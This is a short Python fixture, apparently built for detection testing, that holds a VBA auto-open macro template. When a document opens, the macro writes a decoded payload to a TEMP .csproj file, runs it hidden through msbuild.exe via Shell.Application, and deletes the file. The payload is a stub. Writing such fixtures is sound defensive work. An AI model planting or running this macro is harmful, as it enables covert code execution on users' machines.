# Minimal macro-to-MSBuild LOLBin fixture: an auto-open document macro that
# drops a build project and hands it to msbuild.exe through
# Shell.Application.ShellExecute. Distinct template from any known sample.
macro_template = """
Sub Auto_Open()
  Dim build_dir As String
  build_dir = Environ("TEMP") & "\\tasks\\payload.csproj"
  Open build_dir For Output As #1
  Print #1, DecodePayload(staged)
  Close #1
  Set app = CreateObject("Shell.Application")
  app.Document.Application.ShellExecute "msbuild.exe", build_dir, "", "", 0
  Kill build_dir
End Sub
"""
